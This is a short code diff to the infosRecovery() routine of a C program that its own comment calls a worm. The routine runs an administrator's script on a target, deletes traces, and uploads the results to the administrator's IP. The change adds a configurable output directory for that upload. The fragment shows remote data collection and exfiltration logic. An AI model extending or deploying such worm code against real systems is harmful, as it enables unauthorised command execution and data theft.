@@ -344,7 +344,7 @@ bool infosRecovery()
 	bool ret = false;
 	bool exec = false;
 	char *ip_admin, *target_script_path, *target_dir;
-	char *admin_script, *control, *output;
+	char *admin_script, *control, *output, *output_dir;
 
 	syslogMsg("## Information recovery");
 
@@ -361,6 +361,9 @@ bool infosRecovery()
 
 	// get the control file who allows the worm to be executed
 	control = iniparser_getstring(params, "Target:control", NULL);
+
+	// get the output dirname for the script
+	output_dir = iniparser_getstring(params, "Administrator:output", NULL);
 
 	// get the script name
 	admin_script = iniparser_getstring(params, "Administrator:command", NULL);
@@ -382,7 +385,7 @@ bool infosRecovery()
 			exec = deleteFile(target_script_path);
 			if (exec) {
 				syslogMsg("## Sending results");
-				exec =  uploadFile(output, dirname(admin_script), ip_admin);
+				exec =  uploadFile(output, output_dir, ip_admin);
 				if (exec) {
 					syslogMsg("## Control file reseting");
 					exec = deleteFile(control);
